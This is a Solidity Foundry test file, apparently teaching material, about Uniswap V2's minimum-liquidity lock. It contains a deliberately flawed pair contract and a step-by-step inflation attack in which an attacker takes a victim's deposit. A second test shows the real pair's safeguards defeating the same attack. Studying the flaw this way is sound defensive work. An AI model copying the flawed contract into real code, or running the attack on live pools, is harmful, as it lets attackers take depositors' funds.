// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {UniswapV2Factory} from "uniswapv2/UniswapV2Factory.sol";
import {IUniswapV2Pair} from "uniswapv2/interfaces/IUniswapV2Pair.sol";
import {Math} from "uniswapv2/libraries/Math.sol";

/// @notice 教学用的残缺池子：首池不锁 1000，后续 mint 算出 0 份额也把余额写进储备。
///         正式的 UniswapV2Pair 有两处防护，这个合约只活在测试里：
///         1. 首池 `liquidity = sqrt(amount0 * amount1) - 1000`，并把这 1000 LP 铸给 address(0)，totalSupply 不能降到 1。
///            代码：https://github.com/lbc-2026s3/bootcamp_2026_s3_vibe_coding_foundry/blob/main/src/uniswapv2/UniswapV2Pair.sol#L148
///         2. `require(liquidity > 0)`：份额被整除成 0 时整笔 mint 回滚，币不会记进储备。
///            代码：https://github.com/lbc-2026s3/bootcamp_2026_s3_vibe_coding_foundry/blob/main/src/uniswapv2/UniswapV2Pair.sol#L154
contract VulnerablePair {
    IERC20 public immutable token0;
    IERC20 public immutable token1;
    uint112 public reserve0;
    uint112 public reserve1;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(address tokenA, address tokenB) {
        (address t0, address t1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        token0 = IERC20(t0);
        token1 = IERC20(t1);
    }

    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, 0);
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    /// @dev 直接转入的币要先 sync，下一笔 mint 才会把它们算进储备，而不是算成调用方自己存的。
    function sync() external {
        reserve0 = uint112(token0.balanceOf(address(this)));
        reserve1 = uint112(token1.balanceOf(address(this)));
    }

    function mint(address to) external returns (uint256 liquidity) {
        uint256 balance0 = token0.balanceOf(address(this));
        uint256 balance1 = token1.balanceOf(address(this));
        uint256 amount0 = balance0 - reserve0;
        uint256 amount1 = balance1 - reserve1;

        if (totalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount1);
        } else {
            liquidity = Math.min(amount0 * totalSupply / reserve0, amount1 * totalSupply / reserve1);
        }

        // 算出 0 也记账。币留下，调用方拿不到 LP。
        if (liquidity > 0) {
            totalSupply += liquidity;
            balanceOf[to] += liquidity;
        }
        reserve0 = uint112(balance0);
        reserve1 = uint112(balance1);
    }

    function burn(address to) external returns (uint256 amount0, uint256 amount1) {
        uint256 liquidity = balanceOf[address(this)];
        uint256 balance0 = token0.balanceOf(address(this));
        uint256 balance1 = token1.balanceOf(address(this));
        amount0 = liquidity * balance0 / totalSupply;
        amount1 = liquidity * balance1 / totalSupply;
        balanceOf[address(this)] = 0;
        totalSupply -= liquidity;
        token0.transfer(to, amount0);
        token1.transfer(to, amount1);
        reserve0 = uint112(token0.balanceOf(address(this)));
        reserve1 = uint112(token1.balanceOf(address(this)));
    }
}

/// @notice 模仿 Router：同一笔交易里先把两种币转进池子，再 mint。
contract NaiveRouter {
    function addLiquidity(address pair, address tokenA, address tokenB, uint256 amountA, uint256 amountB, address to)
        external
    {
        IERC20(tokenA).transferFrom(msg.sender, pair, amountA);
        IERC20(tokenB).transferFrom(msg.sender, pair, amountB);
        VulnerablePair(pair).mint(to);
    }
}

contract AttackToken is ERC20 {
    constructor(string memory name_) ERC20(name_, name_) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @notice 文档 docs/uniswap-v2-minimum-liquidity.md 里的数字：不锁 1000 时捐赠和赃款同一量级。
contract MinimumLiquidityAttackTest is Test {
    AttackToken internal tokenA;
    AttackToken internal tokenB;
    NaiveRouter internal router;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function _fund(address user, uint256 amount) internal {
        tokenA.mint(user, amount);
        tokenB.mint(user, amount);
    }

    function _transferBoth(address pair, address from, uint256 amount) internal {
        vm.startPrank(from);
        tokenA.transfer(pair, amount);
        tokenB.transfer(pair, amount);
        vm.stopPrank();
    }

    function _approveRouter(address user) internal {
        vm.startPrank(user);
        tokenA.approve(address(router), type(uint256).max);
        tokenB.approve(address(router), type(uint256).max);
        vm.stopPrank();
    }

    function setUp() public {
        tokenA = new AttackToken("A");
        tokenB = new AttackToken("B");
        router = new NaiveRouter();
    }

    function test_withoutLock_attackerStealsVictimDeposit() public {
        VulnerablePair pair = new VulnerablePair(address(tokenA), address(tokenB));
        _fund(attacker, 100);
        _fund(victim, 100);

        // 1. 攻击者各存 1 wei，拿到池子里唯一的 1 LP。sqrt(1 * 1) = 1。
        _transferBoth(address(pair), attacker, 1);
        vm.prank(attacker);
        uint256 minted = pair.mint(attacker);
        assertEq(minted, 1);
        assertEq(pair.totalSupply(), 1);
        assertEq(pair.balanceOf(attacker), 1);

        // 2. 再各转 5 进池子，不走 mint。sync 后 1 LP 对应 6 枚代币。
        _transferBoth(address(pair), attacker, 5);
        pair.sync();
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        assertEq(reserve0, 6);
        assertEq(reserve1, 6);
        assertEq(pair.totalSupply(), 1);

        // 3. 受害者按正常路径各存 5。5 * 1 / 6 = 0，份额被抹掉，币留在池子里。
        _approveRouter(victim);
        vm.prank(victim);
        // 公式：liquidity = Math.min(amount0 * totalSupply / reserve0, amount1 * totalSupply / reserve1);
        router.addLiquidity(address(pair), address(tokenA), address(tokenB), 5, 5, victim); // 公式：liquidity = 5 * 1 / 6 = 0
        assertEq(pair.balanceOf(victim), 0);
        assertEq(pair.totalSupply(), 1);
        (reserve0, reserve1, ) = pair.getReserves();
        assertEq(reserve0, 11);
        assertEq(reserve1, 11);
        assertEq(tokenA.balanceOf(victim), 95);
        assertEq(tokenB.balanceOf(victim), 95);

        // 4. 烧掉那 1 LP，按 100% 份额提走 11。投入 6，提走 11，利润就是受害者的 5。
        vm.startPrank(attacker);
        pair.transfer(address(pair), 1);
        (uint256 out0, uint256 out1) = pair.burn(attacker);
        vm.stopPrank();

        assertEq(out0, 11);
        assertEq(out1, 11);
        assertEq(pair.totalSupply(), 0);
        assertEq(tokenA.balanceOf(address(pair)), 0);
        assertEq(tokenB.balanceOf(address(pair)), 0);
        assertEq(tokenA.balanceOf(attacker), 105);
        assertEq(tokenB.balanceOf(attacker), 105);
    }

    function test_realPair_sameNumbersCostTheAttacker() public {
        UniswapV2Factory factory = new UniswapV2Factory(attacker);
        IUniswapV2Pair pair = IUniswapV2Pair(factory.createPair(address(tokenA), address(tokenB)));
        _fund(attacker, 10_000);
        _fund(victim, 10_000);

        // 想只留 1 枚可烧毁的 LP，首池得各存 1001：1000 锁进 address(0)，自己剩 1。
        _transferBoth(address(pair), attacker, 1001);
        vm.prank(attacker);
        uint256 minted = pair.mint(attacker);
        assertEq(minted, 1); // 公式：liquidity = Math.sqrt(amount0 * amount1) - 1000 = 1
        assertEq(pair.balanceOf(address(0)), 1000);
        assertEq(pair.balanceOf(attacker), 1);
        assertEq(pair.totalSupply(), 1001);

        // 受害者各存 5 时，要让 5 * 1001 / reserve < 1，储备得大于 5005。池里已有 1001，再各转入 5005。
        _transferBoth(address(pair), attacker, 5005);
        pair.sync();
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        assertEq(reserve0, 6006);
        assertEq(reserve1, 6006);

        // Router 把转币和 mint 放在同一笔交易里。算出 0 份额就整笔回滚，受害者的 5 还在自己手里。
        _approveRouter(victim);
        vm.expectRevert(bytes("UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED"));
        vm.prank(victim);
        router.addLiquidity(address(pair), address(tokenA), address(tokenB), 5, 5, victim);

        assertEq(tokenA.balanceOf(victim), 10_000);
        assertEq(tokenB.balanceOf(victim), 10_000);

        // 攻击者烧掉自己的 1 LP，只能提走 6006 / 1001 = 6。投入 6006，净亏 6000，留在那 1000 枚死 LP 上。
        vm.startPrank(attacker);
        pair.transfer(address(pair), 1);
        (uint256 out0, uint256 out1) = pair.burn(attacker);
        vm.stopPrank();

        assertEq(out0, 6);
        assertEq(out1, 6);
        assertEq(pair.totalSupply(), 1000);
        assertEq(pair.balanceOf(address(0)), 1000);
        assertEq(pair.balanceOf(attacker), 0);
        assertEq(tokenA.balanceOf(address(pair)), 6000);
        assertEq(tokenB.balanceOf(address(pair)), 6000);
        assertEq(tokenA.balanceOf(attacker), 4_000); // 10000 - 1001 - 5005 + 6 = 4000
        assertEq(tokenB.balanceOf(attacker), 4_000); // 10000 - 1001 - 5005 + 6 = 4000
    }
}
